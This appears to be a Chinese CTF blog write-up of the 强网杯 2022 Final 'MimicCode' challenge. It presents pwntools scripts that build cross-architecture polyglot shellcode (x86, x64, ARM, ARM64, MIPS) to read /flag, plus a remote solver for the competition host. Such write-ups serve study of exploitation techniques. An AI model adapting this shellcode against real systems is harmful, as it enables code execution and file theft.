---
title: 强网杯 2022 Final KoH MimicCode
categories:
- CTF/Pwn
tags: 
---

> 更新中...跨架构shellcode

![image](https://xuanxuanblingbling.github.io/assets/pic/qwb/rank.png)

附件：[MimicCode.tgz](https://xuanxuanblingbling.github.io/assets/attachment/qwb/MimicCode.tgz)


## 比赛成绩

```
Rank 1: 0ops with score <41650824>
Rank 1: eee with score <41650824>
Rank 3: 0x300R with score <5531658>
Rank 4: Lilac with score <5119553>
Rank 5: Redbud with score <3056934>
Rank 6: 铁鹰特战队 with score <245566>
Rank 7: NeSE with score <131111>
Rank 8: DAS with score <78122>
Rank 9: 福来阁 with score <61595>
Rank 10: syclover with score <51423>
Rank 11: 雷泽-BOI with score <21063>
Rank 11: Xp0int with score <21063>
```

## x86 & x64

```python
mov eax,cs
sub eax,0x23
jnz x64
x32:
x64:
```

```python
from pwn import *

decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))

compile_x86     = lambda sc : (asm(sc,arch='i386'))
compile_x64     = lambda sc : (asm(sc,arch='amd64'))

shellcode = '''
mov eax,cs
sub eax,0x23
jnz x64
x32:
x64:
'''

print(compile_x86(shellcode).hex())
print(compile_x64(shellcode).hex())

print(decompile_x86(compile_x86(shellcode)))
print(decompile_x64(compile_x86(shellcode)))
```

```python
8cc883e8237500
8cc883e8237500
   0:   8c c8                   mov    eax, cs
   2:   83 e8 23                sub    eax, 0x23
   5:   75 00                   jne    0x7
   0:   8c c8                   mov    eax, cs
   2:   83 e8 23                sub    eax, 0x23
   5:   75 00                   jne    0x7
```

### 比赛版本（110字节）

```python
from pwn import *

compile_x86     = lambda sc : (asm(sc,arch='i386'))
compile_x64     = lambda sc : (asm(sc,arch='amd64'))


decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))

x86_x64_jmp = compile_x86('''
mov eax,cs
mov ebx,0x23
sub eax,ebx
jnz x64
x32:
    mov ebx, 0x67
    push ebx
    mov ebx, 0x616c662f
    push ebx
    mov eax, 5
    mov ebx, esp
    xor ecx, ecx
    int 0x80
    mov ebx, 1
    mov ecx, eax
    xor edx, edx
    mov esi, 1000
    mov eax, 0xbb
    int 0x80
x64:                                     
''')

x64_sc = compile_x64('''
    mov rbx, 0x67616c662f
    push rbx
    mov rax, 2
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 1000
    mov rax, 40
    syscall
''')

shellcode = x86_x64_jmp + x64_sc

print(decompile_x86(x86_x64_jmp))
print(decompile_x64(x64_sc))

print("[+] len: " + str(len(shellcode)))
#io = process("./ShellcodeRunnerX86")
io = process("./ShellcodeRunnerX64")
io.sendlineafter(b"Shellcode >",shellcode)
io.interactive()
```

### 缩减版本（66字节）

```python
from pwn import *

compile_x86     = lambda sc : (asm(sc,arch='i386'))
compile_x64     = lambda sc : (asm(sc,arch='amd64'))

decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))

x86_shellcode = compile_x86('''
mov eax,cs
sub eax,0x23
jnz x64

push 0x67
push 0x616c662f
mov al,  5
mov ebx, esp
xor ecx, ecx
int 0x80

xor  ebx, ebx
inc  ebx
xchg ecx, eax
xor  edx, edx
mov  al,  0xbb
mov  esi, eax

int 0x80

x64:
''')

x64_shellcode = compile_x64('''
push 0x616c662f
movb [rsp+4],0x67
mov al,2
push rsp
pop rdi
xor esi, esi
syscall

xor edi,edi
xchg esi, eax
xor edx, edx
inc edi
mov r10b, 0xff
mov al, 40
syscall
''')

shellcode =  x86_shellcode + x64_shellcode 

print(decompile_x86(x86_shellcode))
print(decompile_x64(x64_shellcode))

print("[+] len: " + str(len(shellcode)))
#io = process("./ShellcodeRunnerX86")
#gdb.attach(io,"b * 0x080497B3")

io = process("./ShellcodeRunnerX64")
#gdb.attach(io,"b * 0x401717")

io.sendlineafter(b"Shellcode >",shellcode)
io.interactive()
```

#### 寻找短指令

```python
from pwn import *

decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))

print("[+] x86: ")
for i in range(256):
    print(decompile_x86(i.to_bytes(1,'little')))

print("[+] x64: ")
for i in range(256):
    print(decompile_x64(i.to_bytes(1,'little')))
```

#### 拆分寄存器

mov rax,1 -> mov al,1

- 32位下：例如对eax，无论动al,ah,ax，eax的高位都不会清零
- 64位下，例如对rax，只有一个特例，动eax，则rax的高位清零，动其余的（al,al,ax），rax高位不会清零

```python
from pwn import *

compile_x86    = lambda sc :  (asm(sc,arch='i386'))
compile_x64    = lambda sc :  (asm(sc,arch='amd64'))
decompile_x64    = lambda sc :  (disasm(sc,arch='amd64'))

x86_shellcode = compile_x86('''
mov eax,0xffffffff
mov al,0x11
mov ah,0x22
mov ax,0x1
''')

x64_shellcode = compile_x64('''
xor rax,rax
dec rax
mov al,0x11 
mov ah,0x22
mov ax,0x1
mov eax,0x2
'''
)

print(decompile_x64(x64_shellcode))

# io = process("./ShellcodeRunnerX86")
# gdb.attach(io,"b * 0x080497B3")

io = process("./ShellcodeRunnerX64")
gdb.attach(io,"b * 0x401717")
io.sendlineafter(b"Shellcode >",x64_shellcode)
io.interactive()
```

### retf版本（49字节）

x86与x64的关系不止是如类上文发现的相应指令集兼容，还有指令集切换。x32->x64，但如果使用qemu-i386不可切换：

```python
from pwn import *

compile_x64     = lambda sc : (asm(sc,arch='amd64'))
decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))

x64_shellcode = compile_x64('''
call code
code:
pop  rcx
add  rcx,10
push 0x33
push rcx
retfq

push 0x616c662f
movb [rsp+4],0x67
xor eax,eax
mov al,2
push rsp
pop rdi
xor esi, esi
syscall

xor edi,edi
xchg esi, eax
xor edx, edx
inc edi
mov r10b, 0xff
mov al, 40
syscall
''')

shellcode = x64_shellcode

print(decompile_x64(x64_shellcode))

print("[+] len: " + str(len(shellcode)))
io = process("./ShellcodeRunnerX86")
#gdb.attach(io,"b * 0x080497B3")

#io = process("./ShellcodeRunnerX64")
#gdb.attach(io,"b * 0x401717")

io.sendlineafter(b"Shellcode >",shellcode)
io.interactive()
```

破产版本，52字节，x64 -> x32 mmap的shellcode地址存在高位，阶段后不可访问： 

```python
from pwn import *
import os

compile_x86     = lambda sc : (asm(sc,arch='i386'))
compile_x64     = lambda sc : (asm(sc,arch='amd64'))

decompile_x86   = lambda sc : (disasm(sc,arch='i386'))
decompile_x64   = lambda sc : (disasm(sc,arch='amd64'))

x86_shellcode = compile_x86('''
xor eax,eax
push 0x67
push 0x616c662f
mov al,  5
mov ebx, esp
xor ecx, ecx
int 0x80

xor  ebx, ebx
inc  ebx
xchg ecx, eax
xor  edx, edx
mov  al,  0xbb
mov  esi, eax

int 0x80
''')

x64_shellcode = compile_x64('''
call code
code:
pop  rcx
mov  rax,rcx
mov  al,0xf0
mov  rsp,rax
add  rcx,18
push 0x23
push rcx
retfq
''')

shellcode = x64_shellcode + x86_shellcode

print(decompile_x86(x86_shellcode))
print(decompile_x64(x64_shellcode))
print("[+] len: " + str(len(shellcode)))

open('sc32','wb').write(make_elf(shellcode,arch='i386'))
open('sc64','wb').write(make_elf(shellcode,arch='amd64'))

os.system("chmod +x ./sc32; ./sc32")
os.system("chmod +x ./sc64; ./sc64")
```

## MIPS & MIPS64

```python
mips_sc = compile_mips('''
    li  $t1, 0x2f666c61
    sw  $t1, ($sp)
    lui $t9, 0x6700
    sw $t9, 4($sp)
    
    li $t1,0xfa5
    li $t2,0x106f
    
    li $t6,0x40054c
    beq $ra,$t6,main
    nop
    li $t1,0x138a
    li $t2,0x13af
    
    main:
    move $a0,$sp
    li $a1,0
    li $a2,0
    move $v0, $t1
    syscall 0x40404

    li $a0, 1
    move $a1, $v0
    li $a3, 100
    move $v0, $t2
    syscall 0x40404
''')
```

## 比赛版本

```
Rank 1: 0ops with score <41650824>
Rank 1: eee with score <41650824>
Rank 3: 0x300R with score <5531658>
Rank 4: Lilac with score <5119553>
Rank 5: Redbud with score <3056934>
Rank 6: 铁鹰特战队 with score <245566>
Rank 7: NeSE with score <131111>
Rank 8: DAS with score <78122>
Rank 9: 福来阁 with score <61595>
Rank 10: syclover with score <51423>
Rank 11: 雷泽-BOI with score <21063>
Rank 11: Xp0int with score <21063>
```

### 本地

```python
from pwn import *

def compile_x86(sc):
    r = asm(sc,arch='i386')
    print(r)
    f = open('86.bin','wb').write(r)
    return r

def decompile_x86(sc):
    r = disasm(sc,arch='i386')
    print(r)
    return r

def compile_x64(sc):
    r = asm(sc,arch='amd64')
    print(r)
    return r

def decompile_x64(sc):
    r = disasm(sc,arch='amd64')
    print(r)
    return r

def compile_arm(sc):
    r = asm(sc,arch='arm')
    print(r)
    return r

def compile_thumb(sc):
    r = asm(sc,arch='thumb')
    print(r)
    return r

def compile_arm64(sc):
    r = asm(sc,arch='aarch64')
    print(r)
    return r

def compile_mips(sc):
    r = asm(sc,arch='mips',endian='big')
    print(r)
    return r

x86_x64_jmp = compile_x86('''
mov eax,cs
mov ebx,0x23
sub eax,ebx
jnz x64
x32:
    mov ebx, 0x67
    push ebx
    mov ebx, 0x616c662f
    push ebx
    mov eax, 5
    mov ebx, esp
    xor ecx, ecx
    int 0x80
    mov ebx, 1
    mov ecx, eax
    xor edx, edx
    mov esi, 1000
    mov eax, 0xbb
    int 0x80
x64:                                     
''')

x64_sc = compile_x64('''
    mov rbx, 0x67616c662f
    push rbx
    mov rax, 2
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 1000
    mov rax, 40
    syscall
''')

arm_sc = compile_arm('''
    adr  r0, flag
    eor  r1, r1
    eor  r2, r2
    mov  r7, #5
    svc  0
    mov  r1, r0
    mov  r0, #1
    eor  r2, r2
    mov  r3, #100
    mov  r7, #0xbb
    svc  0
flag:
	.ascii "/flag"              
''')

arm64_sc = compile_arm64('''
    adr  x1, flag
    mov  x2, #0
    mov  x0, x2
    mov  x8, #56
    svc 0
    /* call sendfile(1, 'x0', 0, 0x7fffffff) */
    mov  x1, x0
    mov  x0, #1
    mov  x2, #0
    mov  x3, 100
    mov  x8, #SYS_sendfile
    svc 0
flag:
	.asciz "/flag" 
''')

mips_sc = compile_mips('''
    li  $t1, 0x2f666c61
    sw  $t1, ($sp)
    lui $t9, 0x6700
    sw $t9, 4($sp)
    
    li $t1,0xfa5
    li $t2,0x106f
    
    li $t6,0x40054c
    beq $ra,$t6,main
    nop
    li $t1,0x138a
    li $t2,0x13af
    
    main:
    move $a0,$sp
    li $a1,0
    li $a2,0
    move $v0, $t1
    syscall 0x40404

    li $a0, 1
    move $a1, $v0
    li $a3, 100
    move $v0, $t2
    syscall 0x40404
''')

#io = process("./ShellcodeRunnerX86")
#gdb.attach(io,"b * 0x080497B3")

#io = process("./ShellcodeRunnerX64")
#gdb.attach(io,"b * 0x401717")

#io = process(["/bin/sh",'-c','qemu-arm ./ShellcodeRunnerARM32'])
#io = process(["/bin/sh",'-c','qemu-arm -g 1234 ./ShellcodeRunnerARM32'])
#gdb.attach(io,"b * 0x10614")

#io = process(["/bin/sh",'-c','qemu-aarch64 ./ShellcodeRunnerARM64'])
#io = process(["/bin/sh",'-c','qemu-aarch64 -g 1234 ./ShellcodeRunnerARM64'])
#b * 0x400768

#io = process(["/bin/sh",'-c','qemu-mips ./ShellcodeRunnerMIPS'])
#io = process(["/bin/sh",'-c','qemu-mips -g 1234 ./ShellcodeRunnerMIPS'])
#b * 0x400544

io = process(["/bin/sh",'-c','qemu-mips64 ./ShellcodeRunnerMIPS64'])
#io = process(["/bin/sh",'-c','qemu-mips64 -g 1234 ./ShellcodeRunnerMIPS64'])
#b * 120004088

thumb_jmp = compile_arm('''
    add    r2, pc, #1
    bx     r2                        
''')

arm_jmp   = bytes.fromhex('2c0000ea')
jmp_0x36_x86_x64 = bytes.fromhex('eb34001c')

#    2273ff9c        addi    s3, s3, -100
#    1a600050        blez    s3, 0x144
#    2273ff9c        addi    s3, s3, -100 !!! nop
#    2273ff9c        addi    s3, s3, -100 !!! nop

mips_jmp = bytes.fromhex('2273ff9c1a6000512273ff9c2273ff9c')
#mips_jmp = bytes.fromhex('1ae0003b')


test = arm_jmp + mips_jmp + jmp_0x36_x86_x64 + arm64_sc + x86_x64_jmp + x64_sc
test = test.ljust(0xbc,b'a') # len: 0xbc
test += arm_sc               # len: 0xf0  arm_sc : 52
test += mips_sc              # len: 0x134 mips_sc: 68

#print(disasm(mips_sc,arch='mips',endian='big'))

#test = test.ljust(0x150,b'a')
test += bytes.fromhex('18000000') # bug

#  0:   1800ffea        blez    zero, 0xffffffac
#  mips jump back
test += bytes.fromhex('1800ffe7')

print(len(test))
print((test).hex())
print(pow(0x1000/len(test),6))
io.send(test)
io.interactive()
```

### 远程

```python
from pwn import *
from hashlib import *
import os
#context(arch='i386',log_level='debug')

io = remote("172.20.5.61",9999)
io.recvuntil(b"'''\nchal: ")
chal = io.recvline().replace(b"\n",b"")
log.success(str(chal))

sol = b''

for i in range(0x1000000):
    tmp = os.urandom(4)
    if sha256(chal+ tmp).hexdigest().startswith('00000') :
        print(tmp.hex())
        sol = tmp.hex()
        break
    
def compile_x86(sc):
    r = asm(sc,arch='i386')
    print(r)
    f = open('86.bin','wb').write(r)
    return r

def decompile_x86(sc):
    r = disasm(sc,arch='i386')
    print(r)
    return r

def compile_x64(sc):
    r = asm(sc,arch='amd64')
    print(r)
    return r

def decompile_x64(sc):
    r = disasm(sc,arch='amd64')
    print(r)
    return r

def compile_arm(sc):
    r = asm(sc,arch='arm')
    print(r)
    return r

def compile_thumb(sc):
    r = asm(sc,arch='thumb')
    print(r)
    return r

def compile_arm64(sc):
    r = asm(sc,arch='aarch64')
    print(r)
    return r

def compile_mips(sc):
    r = asm(sc,arch='mips',endian='big')
    print(r)
    return r

x86_x64_jmp = compile_x86('''
mov eax,cs
mov ebx,0x23
sub eax,ebx
jnz x64
x32:
    mov ebx, 0x67
    push ebx
    mov ebx, 0x616c662f
    push ebx
    mov eax, 5
    mov ebx, esp
    xor ecx, ecx
    int 0x80
    mov ebx, 1
    mov ecx, eax
    xor edx, edx
    mov esi, 1000
    mov eax, 0xbb
    int 0x80
x64:                                     
''')

x64_sc = compile_x64('''
    mov rbx, 0x67616c662f
    push rbx
    mov rax, 2
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 1000
    mov rax, 40
    syscall
''')

arm_sc = compile_arm('''
    adr  r0, flag
    eor  r1, r1
    eor  r2, r2
    mov  r7, #5
    svc  0
    mov  r1, r0
    mov  r0, #1
    eor  r2, r2
    mov  r3, #100
    mov  r7, #0xbb
    svc  0
flag:
	.ascii "/flag"              
''')

arm64_sc = compile_arm64('''
    adr  x1, flag
    mov  x2, #0
    mov  x0, x2
    mov  x8, #56
    svc 0
    /* call sendfile(1, 'x0', 0, 0x7fffffff) */
    mov  x1, x0
    mov  x0, #1
    mov  x2, #0
    mov  x3, 100
    mov  x8, #SYS_sendfile
    svc 0
flag:
	.asciz "/flag" 
''')

mips_sc = compile_mips('''
    li  $t1, 0x2f666c61
    sw  $t1, ($sp)
    lui $t9, 0x6700
    sw $t9, 4($sp)
    
    li $t1,0xfa5
    li $t2,0x106f
    
    li $t6,0x40054c
    beq $ra,$t6,main
    nop
    li $t1,0x138a
    li $t2,0x13af
    
    main:
    move $a0,$sp
    li $a1,0
    li $a2,0
    move $v0, $t1
    syscall 0x40404

    li $a0, 1
    move $a1, $v0
    li $a3, 100
    move $v0, $t2
    syscall 0x40404
''')

arm_jmp   = bytes.fromhex('2c0000ea')
jmp_0x36_x86_x64 = bytes.fromhex('eb34001c')

#    2273ff9c        addi    s3, s3, -100
#    1a600050        blez    s3, 0x144
#    2273ff9c        addi    s3, s3, -100 !!! nop
#    2273ff9c        addi    s3, s3, -100 !!! nop

mips_jmp = bytes.fromhex('2273ff9c1a6000512273ff9c2273ff9c')
#mips_jmp = bytes.fromhex('1ae0003b')


test = arm_jmp + mips_jmp + jmp_0x36_x86_x64 + arm64_sc + x86_x64_jmp + x64_sc
test = test.ljust(0xbc,b'a') # len: 0xbc
test += arm_sc               # len: 0xf0  arm_sc : 52
test += mips_sc              # len: 0x134 mips_sc: 68

#print(disasm(mips_sc,arch='mips',endian='big'))

#test = test.ljust(0x150,b'a')
test += bytes.fromhex('18000000') # bug

#  0:   1800ffea        blez    zero, 0xffffffac
#  mips jump back
test += bytes.fromhex('1800ffe7')

test = test.hex()

f = open('sc.bin','wb').write(bytes.fromhex(test))
print(test)

io.sendafter(b"sol:",sol.encode())
sleep(0.1)
io.sendlineafter(b"Input your team token",b'111111')
io.sendlineafter(b"(0x1000 max, hex, end with",test)
io.interactive()
```